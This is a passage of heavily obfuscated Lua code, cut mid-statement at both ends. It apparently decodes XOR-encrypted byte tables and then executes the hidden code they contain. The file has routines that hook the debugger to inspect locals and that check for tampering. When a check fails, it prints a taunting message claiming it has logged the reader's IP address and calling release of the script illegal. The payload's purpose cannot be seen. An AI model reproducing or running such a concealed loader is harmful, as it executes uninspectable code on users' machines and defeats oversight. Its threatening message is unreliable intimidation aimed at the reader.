\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; xyZOyXQzri7dhgKAqhjfYNkmPiObbQ6uAkVnvonn4rJj0HVVbff2mqrIriaCy3Q7W3jdccQ(
{ 1005, 885, 1047, 905, 658, 979, 653, 784, 997, 673, 1107, 1140, 1088, 1057, 592, 605, 1201, 1193, 912, 956, 1064, 582,
  998, 978, 703, 911, 852, 899, 889, 1134, 663, 660, 848, 982, 788, 975, 1207, 684, 985, 814, 790, 769, 1203, 958, 1012,
  1132, 667, 1004, 752, 1196, 1185, 739, 875, 1098, 902, 656, 633, 1011, 686, 835, 849, 991, 860, 1020, 840, 741, 1122,
  952, 1109, 821, 1120, 1101, 590, 612, 918, 924, 711, 1197, 820, 1084, 596, 1079, 1100, 567, 664, 1091, 774, 813, 732,
  559, 665, 549, 830, 710, 857, 983, 968, 1119, 948, 602, 650, 800, 646, 733, 839, 687, 785, 859, 1056, 977, 834, 764,
  1042, 873, 942, 1052, 855, 944, 973, 1066, 1208, 666, 753, 1194, 682, 1085, 707, 625, 623, 1001, 793, 725, 556, 628,
  932, 649, 1062, 1039, 598, 1074, 1068, 900, 775, 629, 695, 668, 880, 819, 705, 645, 841, 877, 947, 719, 783, 861, 565,
  608, 984, 798, 744, 543, 1177, 923, 581, 1072, 1025, 1095, 1114, 647, 799, 659, 1166, 1016, 654, 1104, 989, 1160, 832,
  586, 993, 723, 1156, 1184, 996, 888, 692, 777, 548, 1078, 1036, 1204, 693, 922, 730, 869, 779, 1181, 562, 1000, 771,
  595, 702, 584, 1123, 804, 913, 1155, 588, 676, 1198, 1013, 716, 898, 747, 569, 740, 662, 651, 709, 936, 1096, 1097,
  1186, 1086, 1075, 826, 1116, 960, 1158, 611, 1024, 1130, 699, 574, 759, 1063, 1038, 1106, 1051, 603, 1129, 691, 815,
  986, 1170, 1054, 661, 594, 846, 618, 959, 941, 599, 679, 1021, 1026, 934, 919, 845, 772, 1152, 1165, 749, 843, 1035,
  630, 1200, 1028, 560, 766, 976, 754, 851, 870, 1007, 907, 751, 1189, 632, 589, 810, 669, 778, 745, 1040, 1014, 619,
  1017, 887, 797, 987, 728, 1008, 892, 756, 1163, 1135, 1212, 1073, 1044, 689, 1188, 836, 920, 1055, 762, 1018, 554, 787,
  980, 802, 837, 961, 966, 729, 614, 933, 891, 765, 571, 807, 1159, 1030, 758, 737, 1002, 962, 917, 591, 955, 916, 972,
  615, 926, 580, 683, 895, 1080, 1149, 853, 1162, 1115, 990, 910, 631, 915, 816, 761, 553, 931, 1077, 963, 878, 971, 734,
  1199, 670, 908, 722, 1006, 712, 831, 1126, 748, 767, 600, 882, 792, 1192, 657, 780, 572, 838, 566, 818, 610, 938, 789,
  561, 738, 876, 742, 1144, 616, 1209, 713, 794, 970, 675, 1139, 1210, 637, 950, 568, 1187, 943, 552, 585, 937, 893, 964,
  583, 1110, 1164, 1133, 770, 974, 824, 822, 672, 757, 1105, 967, 1125, 1103, 1145, 1143, 1136, 1211, 806, 1102, 640,
  1076, 1048, 1108, 1175, 620, 546, 731, 708, 871, 809, 706, 577, 1174, 1111, 1142, 1059, 613, 1151, 555, 854, 1093,
  1010, 951, 1138, 803, 1045, 617, 685, 1141, 698, 1169, 638, 1046, 994, 864, 551, 624, 844, 1205, 1179, 1015, 1191, 865,
  1032, 796, 544, 1146, 704, 1083, 1053, 1050, 635, 1182, 746, 1171, 1128, 1178, 999, 1058, 858, 680, 811, 1092, 1031,
  969, 1147, 601, 862, 894, 847, 1127, 634, 1117, 981, 1176, 1049, 674, 678, 1168, 655, 1148, 714, 1065, 795, 833, 1060,
  639, 949, 1043, 677, 817, 736, 715, 867, 886, 578, 1071, 727, 786, 903, 1003, 812, 1099, 690, 1154, 545, 890, 881, 644,
  1023, 782, 883, 827, 939, 1069, 681, 1157, 626, 735, -1, 70, 90, 126, 100, 13, 120, 18, 246, 38, 101, 88, 70, 88, 28,
  108, 193, 62, 18, 73, 111, 43, 188, 64, 85, 28, 119, 98, 183, 49, 121, 137, 6, 81, 33, 106, 93, 250, 68, 117, 39, 126,
  102, 45, 85, 183, 74, 98, 40, 103, 40, 16, 41, 10, 9, 122, 47, 91, 83, 97, 45, 62, 220, 28, 186, 39, 80, 163, 100, 1,
  126, 0, 47, 97, 43, 43, 108, 21, 114, 56, 212, 51, 51, 10, 35, 60, 55, 66, 36, 49, 65, 37, 82, 107, 17, 22, 37, 6, 107,
  165, 231, 40, 6, 73, 57, 30, 54, 24, 20, 85, 32, 57, 109, 121, 38, 108, 49, 88, 1, 70, 72, 34, 107, 40, 122, 106, 0,
  11, 18, 160, 111, 21, 121, 29, 66, 98, 107, 33, 73, 64, 100, 119, 123, 62, 40, 2, 226, 28, 103, 42, 123, 89, 188, 56,
  209, 248, 22, 48, 223, 148, 127, 52, 90, 98, 34, 11, 58, 54, 65, 119, 68, 28, 85, 37, 100, 135, 140, 67, 219, 69, 97,
  84, 161, 3, 174, 82, 105, 32, 118, 18, 16, 23, 103, 37, 34, 64, 99, 1, 36, 90, 106, 215, 112, 121, 121, 121, 22, 34,
  19, 43, 1, 98, 49, 137, 79, 111, 33, 17, 62, 27, 34, 106, 32, 101, 16, 0, 142, 73, 55, 123, 0, 84, 60, 100, 72, 84, 16,
  97, 79, 54, 30, 123, 40, 26, 69, 1, 121, 121, 121, 13, 119, 120, 68, 100, 29, 51, 105, 126, 68, 201, 10, 1, 67, 169,
  119, 4, 221, 39, 38, 38, 57, 18, 18, 73, 4, 81, 114, 52, 2, 36, 26, 206, 34, 101, 26, 78, 195, 196, 100, 52, 86, 18,
  57, 46, 36, 94, 65, 82, 48, 106, 94, 121, 62, 13, 83, 119, 39, 48, 156, 64, 27, 7, 92, 54, 236, 100, 121, 35, 18, 95,
  78, 128, 5, 29, 16, 11, 4, 1, 60, 6, 227, 65, 155, 82, 103, 112, 73, 136, 49, 48, 120, 121, 201, 53, 77, 44, 98, 29,
  38, 103, 119, 13, 68, 17, 14, 219, 66, 10, 60, 125, 83, 83, 193, 55, 159, 42, 109, 10, 107, 12, 106, 101, 199, 49, 18,
  73, 73, 52, 62, 230, 117, 98, 72, 164, 78, 10, 30, 184, 101, 100, 119, 7, 1, 127, 43, 4, 18, 100, 64, 44, 6, 37, 91,
  193, 68, 90, 61, 34, 55, 54, 26, 169, 208, 106, 15, 240, 36, 104, 63, 69, 64, 121, 38, 31, 7, 77, 106, 56, 59, 99, 109,
  41, 36, 2, 49, 21, 10, 28, 37, 22, 105, 107, 84, 78, 87, 78, 72, 106, 7, 15, 19, 112, 113, 226, 74, 17, 27, 100, 96,
  114, 42, 32, 45, 120, 78, 15, 101, 139, 83, 18, 40, 98, 26, 123, 117, 76, 47, 70, 114, 36, 206, 99, 22, 70, 29, 241,
  118, 237, 54, 46, 35, 110, 11, 16, 108, 88, 23, 101, 8, 43, 60, 35, 63, 34, 64, 22, 121, 51, 83, 2, 49, 119, 48, 91,
  119, 87, 18, 1, 53, 42, 103, 3, 109, 114, 29, 131, 28, 110, 249, 88, 70, 18, 65, 103, 101, 18, 125, 101, 20, 91, 145,
  79, 9, 75, 99, 12, 22, 170, 182, 55, 41, 75, 90, 102, 56, 121, 16, 23, 57, 86, 83, 28, 30, 76, 50, 1, 65, 99, 85, 109,
  160, 154, 99, 47, 87, 69, 39, 21, 37, 106, 48, 66, 255, 119, 23, 88, 85, 32, 58, 175, 26, 8, 109, 36, 83, 176, 35, 6,
  34, 79, 34, 111, 18, 29, 76, 109, 65, 69, 23, 50, 12, 230, 101, 75, 85, 87, 39, 20, 114, 106, 32, 85, 52, 29, 122, 29,
  101, 58, 58, 65, 115, 177, 15, 85, 43, 125, 114, 63, 253, 78, 101, 104, 87, 119, 73, 26, 45, 47, 158, 12, 84, 52, 21,
  36, 8, 95, 95, 106, 40, 38, 46, 99, 70, 87, 238, 23, 99, 46, 17, 101, 104 }, "resEWsKEYauRD2YiCGJ2MAndWx"); d6b6BLhfzHAvVoLjdTUBf3Y51itnAU14yZFC0fy8Yz6SFF7ARy0ZifIcp8jLv7ojmZkEmpIG =
os46LAXGc9JvRkey1TapmhuH11GGq6KtIa9W16DZUXiZ5znmyMMF3RUqvA50oG00hcPkh; miLicqYZnOWc7K93j9hH2kyhjcyaUzMaOmhfP36Vw5QUPljYyqcDh7FZCtPMFLyM =
os46LAXGc9JvRkey1TapmhuH11GGq6KtIa9W16DZUXiZ5znmyMMF3RUqvA50oG00hcPkh; aIg7LLrbgNxH4aUovkP1SlFvssDuYRXdx8wWEeQAhNtgr7bt4OO6SmjLQJKfj =
miLicqYZnOWc7K93j9hH2kyhjcyaUzMaOmhfP36Vw5QUPljYyqcDh7FZCtPMFLyM; ozKwczJ3atlqlimEGhpEE5PRDJmNzKlVY0PSoM0w0F0tTMtbxqd =
aIg7LLrbgNxH4aUovkP1SlFvssDuYRXdx8wWEeQAhNtgr7bt4OO6SmjLQJKfj; cZtk8JbQgKWwVOPKzbreTx9bz955f9XrJ2ep497IXCJpS4lCtqSV5nlz =
ozKwczJ3atlqlimEGhpEE5PRDJmNzKlVY0PSoM0w0F0tTMtbxqd; dpO7aZjdu0oRS2EcWmY7OI4H2jKQfDWPpSRTJFQYjlqSgPliQl75xkDJbgF =
cZtk8JbQgKWwVOPKzbreTx9bz955f9XrJ2ep497IXCJpS4lCtqSV5nlz; k0kHLG9RxA2EDfDVupCxqIgpixFPnTjngcmVkaI6mNccYVuJXMy =
dpO7aZjdu0oRS2EcWmY7OI4H2jKQfDWPpSRTJFQYjlqSgPliQl75xkDJbgF; uVO8KRuluaTjEO5PDV3j22B1ee4sQY6ntFq8WwBbmG6KrG1lBvs75KwfA =
k0kHLG9RxA2EDfDVupCxqIgpixFPnTjngcmVkaI6mNccYVuJXMy; ruXiKdSSw8HIOQzQRl6HiACA0s96CVdRPIlJ9QHJKa9r1KTiGuhmA =
uVO8KRuluaTjEO5PDV3j22B1ee4sQY6ntFq8WwBbmG6KrG1lBvs75KwfA; vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI = function(
  a)
  K, F = 7418757222105782, 16384 + 3267; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; icQ75sQ5glWoh9tenanpcHTO3Fz7hgBnId9o6Bc5BugmnnU1uirdl1QVA9MWs = function(b)
  co = coroutine.create(b)
  ukYh5jktbLJhV4JVuw2vIodUtrufGiFlKOkYW4LLME1KGYMTP6kXRj = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(ukYh5jktbLJhV4JVuw2vIodUtrufGiFlKOkYW4LLME1KGYMTP6kXRj, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return ukYh5jktbLJhV4JVuw2vIodUtrufGiFlKOkYW4LLME1KGYMTP6kXRj
end; iRUYnjZZ5kPCGvUflypKIGKdJEtoNiYACFd3zkmF6IlIkeBmkuWmLDMd = function(f, g)
  fmBgh4S2XOd4xOqGc2bBqe8P6WQe8gkGw49YAmopAYDdNAdbJ1J2PsNoLeEjwvJ = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; nDlHqPrmS9rIPdfPCRNZ9YqHdxAn1CXrVqW6QaGAsHiHnPNUYwsfJ1PrS7I = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; ggvDy6MUEPWVlTYSg3EzRxWPUEtaAc3zaaDxFCtEgG9MMilETEJZ1dzG4chZYYaR = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      fmBgh4S2XOd4xOqGc2bBqe8P6WQe8gkGw49YAmopAYDdNAdbJ1J2PsNoLeEjwvJ(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; o2xEGnt9LDOv8hQDarz3pMXRgApdReX0Y5LnU1OWKKf35B4Cn4XwFnjlKgTRdt = function(p, n)
    pYlBnjOPDf5KvLH36KjKyCxbo6dn1F07kp9ByhSNxQV33tIkCSIhK6WpcF52CYuaA = ""
    for k, q in pairs(p) do pYlBnjOPDf5KvLH36KjKyCxbo6dn1F07kp9ByhSNxQV33tIkCSIhK6WpcF52CYuaA =
      pYlBnjOPDf5KvLH36KjKyCxbo6dn1F07kp9ByhSNxQV33tIkCSIhK6WpcF52CYuaA ..
      ruXiKdSSw8HIOQzQRl6HiACA0s96CVdRPIlJ9QHJKa9r1KTiGuhmA
      [vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('77') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('CA') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('24') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('39') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('D8') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('93')]
      [vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('47') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('E6') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('A1') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('24')](
      q) end
    ; n(pYlBnjOPDf5KvLH36KjKyCxbo6dn1F07kp9ByhSNxQV33tIkCSIhK6WpcF52CYuaA)
  end; nDlHqPrmS9rIPdfPCRNZ9YqHdxAn1CXrVqW6QaGAsHiHnPNUYwsfJ1PrS7I(f,
    function(r) ggvDy6MUEPWVlTYSg3EzRxWPUEtaAc3zaaDxFCtEgG9MMilETEJZ1dzG4chZYYaR(r, g,
        function(s) o2xEGnt9LDOv8hQDarz3pMXRgApdReX0Y5LnU1OWKKf35B4Cn4XwFnjlKgTRdt(s,
            function(t) if #icQ75sQ5glWoh9tenanpcHTO3Fz7hgBnId9o6Bc5BugmnnU1uirdl1QVA9MWs(ruXiKdSSw8HIOQzQRl6HiACA0s96CVdRPIlJ9QHJKa9r1KTiGuhmA[vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('32') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('2B') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('A1') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('9A')]) == 1 then if ruXiKdSSw8HIOQzQRl6HiACA0s96CVdRPIlJ9QHJKa9r1KTiGuhmA[vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('32') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('2B') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('A1') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('9A')] == ruXiKdSSw8HIOQzQRl6HiACA0s96CVdRPIlJ9QHJKa9r1KTiGuhmA[vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('7E') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('24') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('39') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('D8') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('CA')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if ruXiKdSSw8HIOQzQRl6HiACA0s96CVdRPIlJ9QHJKa9r1KTiGuhmA[vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('32') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('2B') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('A1') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('9A')](t) then
                    ruXiKdSSw8HIOQzQRl6HiACA0s96CVdRPIlJ9QHJKa9r1KTiGuhmA
                        [vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('32') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('2B') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('A1') .. vPBLwhSst1IrXAukGMImbfrqKBaEqDePDDQv1nuPqhHK1dJlKuQzXn8Kv1DtwYkI('9A')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; iRUYnjZZ5kPCGvUflypKIGKdJEtoNiYACFd3zkmF6IlIkeBmkuWmLDMd(
{ 780, 1181, 592, 1182, 547, 560, 828, 1205, 795, 985, 786, 1107, 1105, 664, 1147, 628, 966, 1103, 973, 736, 1019, 970,
  751, 901, 713, 821, 617, 838, 760, 1211, 853, 1206, 773, 1194, 799, 551, 951, 907, 1142, 696, 1059, 785, 793, 1063,
  738, 554, 561, 885, 618, 983, 1007, 980, 688, 990, 857, 708, 733, 940, 893, 612, 910, 1055, 1155, 836, 762, 654, 1189,
  653, 897, 817, 668, 1174, 932, 1113, 822, 914, 859, 1071, 1042, 958, 692, 971, 937, 698, 1084, 832, 1139, 777, 886,
  1005, 746, 599, 819, 824, 879, 577, 891, 546, 1165, 814, 1125, 787, 616, 658, 1138, 995, 823, 925, 888, 1110, 673,
  1068, 922, 924, 1117, 1134, 557, 952, 657, 1123, 908, 634, 1088, 659, 831, 552, 753, 1203, 1162, 645, 704, 1126, 1193,
  758, 867, 1132, 646, 1202, 847, 652, 740, 1027, 880, 1192, 800, 1159, 841, 1191, 613, 898, 585, 1054, 947, 550, 1013,
  877, 1158, 693, 767, 587, 553, 1083, 609, 939, 792, 739, 680, 982, 835, 852, 864, 1087, 923, 1065, 566, 1170, 1070,
  724, 611, 1185, 1207, 931, 892, 779, 1109, 994, 771, 1004, 694, 854, 1146, 1101, 606, 671, 632, 1090, 676, 1057, 919,
  998, 1172, 829, 796, 1073, 759, 979, 1062, 849, 730, 1195, 1199, 1212, 624, 812, 858, 619, 593, 1164, 1118, 549, 1001,
  927, 681, 802, 1029, 648, 902, 636, 756, 963, 837, 1200, 1169, 1080, 882, 572, 748, 677, 625, 1148, 1106, 1129, 1150,
  830, 545, 1050, 1012, 825, 933, 866, 631, 667, 895, 896, 747, 1161, 955, 804, 638, 818, 735, 1079, 961, 679, 1163, 981,
  765, 913, 651, 725, 598, 775, 669, 805, 936, 1024, 953, 604, 987, 699, 1114, 945, 594, 769, 744, 1060, 904, 956, 1135,
  716, 811, 635, 986, 672, 934, 1035, 1086, 975, 905, 782, 861, 722, 843, 1097, 1074, 685, 1067, 647, 711, 1093, 816,
  1149, 991, 766, 741, 845, 607, 1025, 943, 878, 1095, 856, 1072, 1008, 588, 978, 1160, 781, 850, 695, 1204, 1064, 788,
  686, 1085, 834, 1104, 1153, 641, 928, 813, 1154, 712, 1173, 589, 920, 1127, 729, 944, 871, 1099, 567, 798, 717, 794,
  965, 543, 683, 1178, 1133, 1096, 737, 807, 1201, 640, 1031, 605, 691, 1102, 873, 1111, 574, 1209, 743, 705, 1186, 1092,
  960, 614, 727, 906, 565, 728, 1043, 903, 844, 721, 870, 1030, 582, 689, 1016, 1145, 637, 580, 621, 1052, 1053, 1179,
  627, 921, 883, 1039, 1184, 967, 548, 662, 754, 1196, 946, 1122, 761, 629, 731, 803, 950, 1020, 1044, 848, 556, 1143,
  544, 633, 1131, 682, 815, 1010, 1168, 872, 964, 772, 684, 1108, 586, 622, 959, 890, 810, 603, 718, 774, 1100, 709, 752,
  1034, 734, 597, 833, 1015, 791, 1045, 639, 707, 715, 1119, 650, 992, 930, 1115, 703, 976, 1028, 630, 874, 1066, 1069,
  1046, 665, 894, 770, 855, 806, 917, 1089, 595, 720, 1210, 726, 997, 962, 1040, 742, 1091, 1140, 869, 912, 1002, 714,
  690, 745, 596, 1098, 1128, 1112, 865, 974, 808, 938, 1009, 1120, 840, 581, 826, 678, 749, 620, 610, 1141, 1188, 776,
  1177, 984, 797, 876, 972, 860, 1023, 999, 863, 1171, 889, 809, 1036, 887, 750, 643, 644, 1137, 790, 1116, 764, 666,
  555, 875, 827, 601, 1032, 562, 899, 911, 1144, 579, -1, 72, 111, 76, 96, 94, 49, 3, 117, 84, 69, 31, 111, 113, 84, 36,
  16, 78, 32, 112, 81, 1, 196, 88, 79, 113, 123, 23, 215, 137, 68, 85, 68, 107, 38, 84, 140, 43, 24, 110, 18, 146, 109,
  112, 29, 88, 51, 99, 236, 110, 93, 60, 22, 99, 83, 76, 11, 113, 247, 119, 28, 28, 20, 24, 66, 64, 61, 117, 118, 75, 37,
  64, 115, 236, 39, 25, 28, 105, 71, 38, 72, 195, 11, 93, 248, 82, 37, 81, 37, 92, 100, 99, 69, 114, 34, 6, 42, 25, 20,
  22, 233, 43, 111, 125, 111, 33, 88, 169, 35, 110, 23, 35, 57, 49, 163, 35, 24, 96, 48, 22, 7, 136, 52, 18, 51, 87, 7,
  35, 230, 64, 110, 49, 244, 182, 107, 38, 23, 19, 93, 115, 97, 103, 63, 46, 111, 214, 80, 4, 119, 73, 66, 5, 112, 88,
  113, 24, 32, 52, 182, 140, 106, 12, 122, 78, 177, 13, 23, 94, 183, 91, 64, 42, 77, 15, 29, 112, 54, 174, 110, 1, 37,
  226, 124, 68, 23, 112, 72, 82, 72, 123, 23, 74, 7, 2, 122, 114, 10, 16, 7, 76, 113, 23, 103, 111, 58, 59, 72, 78, 86,
  6, 30, 22, 27, 43, 37, 251, 6, 95, 86, 97, 34, 214, 43, 44, 16, 31, 247, 38, 25, 20, 48, 47, 44, 4, 63, 68, 144, 2,
  122, 121, 113, 59, 166, 112, 26, 114, 119, 196, 102, 32, 109, 83, 83, 9, 101, 64, 115, 97, 50, 137, 112, 105, 55, 35,
  126, 42, 93, 16, 44, 92, 126, 76, 35, 23, 59, 27, 2, 110, 212, 3, 84, 81, 120, 37, 97, 115, 49, 127, 31, 126, 60, 61,
  114, 113, 71, 28, 95, 228, 99, 1, 250, 29, 32, 17, 24, 55, 24, 68, 121, 207, 125, 77, 118, 17, 82, 24, 113, 105, 43,
  53, 209, 67, 116, 80, 106, 24, 239, 22, 114, 109, 118, 104, 117, 125, 36, 80, 110, 84, 118, 3, 4, 19, 121, 35, 11, 17,
  24, 80, 119, 72, 87, 32, 88, 14, 46, 83, 60, 98, 128, 60, 56, 49, 24, 122, 83, 78, 83, 206, 40, 34, 22, 35, 126, 208,
  144, 24, 172, 95, 58, 22, 36, 74, 23, 18, 139, 91, 16, 83, 60, 91, 50, 35, 111, 115, 54, 86, 26, 105, 46, 19, 65, 111,
  0, 40, 111, 71, 240, 233, 19, 12, 56, 26, 31, 0, 64, 138, 92, 122, 113, 86, 71, 41, 113, 88, 22, 62, 136, 27, 41, 84,
  56, 72, 16, 17, 28, 222, 35, 117, 14, 44, 83, 62, 28, 67, 97, 13, 214, 213, 69, 92, 123, 29, 83, 87, 239, 78, 95, 123,
  208, 57, 12, 36, 104, 11, 103, 105, 3, 92, 78, 24, 34, 101, 183, 42, 68, 68, 113, 119, 31, 138, 124, 22, 54, 59, 75, 9,
  34, 83, 37, 85, 84, 239, 24, 25, 24, 140, 92, 108, 118, 6, 0, 103, 58, 38, 61, 145, 216, 9, 15, 206, 45, 110, 126, 89,
  71, 119, 123, 115, 7, 20, 123, 27, 103, 74, 17, 56, 43, 43, 112, 80, 15, 104, 28, 181, 133, 62, 203, 89, 63, 203, 233,
  122, 99, 83, 78, 97, 64, 111, 98, 115, 118, 55, 40, 41, 83, 27, 114, 118, 87, 16, 24, 11, 105, 4, 54, 23, 23, 1, 41,
  100, 87, 112, 120, 22, 112, 29, 78, 55, 69, 121, 117, 36, 252, 9, 86, 41, 105, 43, 97, 110, 36, 111, 4, 7, 217, 110,
  80, 36, 112, 113, 92, 24, 57, 93, 116, 34, 62, 5, 50, 191, 160, 30, 17, 9, 140, 207, 66, 57, 32, 42, 45, 22, 30, 39,
  40, 169, 71, 36, 107, 87, 89, 59, 35, 90, 42, 18, 119, 53, 248, 96, 6, 173, 54, 99, 71, 164, 63, 58, 101, 11, 33, 87,
  98, 23, 0, 250, 133, 20, 32, 24, 110, 60, 72, 35, 61, 110, 13, 97, 97, 92, 83 }, "p08t8OCNA7ngVQSPsxhGWOsRIw"); wAulc3RTyGS8YIPS009xYsp94C8S2O9zEUhWPWRhNG9wPK9dy7L0aF2v8RHq =
